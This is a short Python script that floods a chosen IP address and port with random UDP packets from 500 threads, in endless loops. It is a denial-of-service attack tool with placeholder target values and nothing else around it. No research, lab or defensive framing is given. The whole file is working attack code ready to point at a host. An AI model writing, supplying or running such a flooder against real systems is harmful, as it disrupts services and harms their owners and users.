import socket
import random
import threading

target_ip = "192.168.0.1"  # Replace with target IP
target_port = 80  # Replace with target port
threads = 500  # Number of threads

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    while True:
        sock.sendto(bytes, (target_ip, target_port))
        print(f"UDP packet sent to {target_ip}:{target_port}")

for i in range(threads):
    thread = threading.Thread(target=udp_flood)
    thread.start()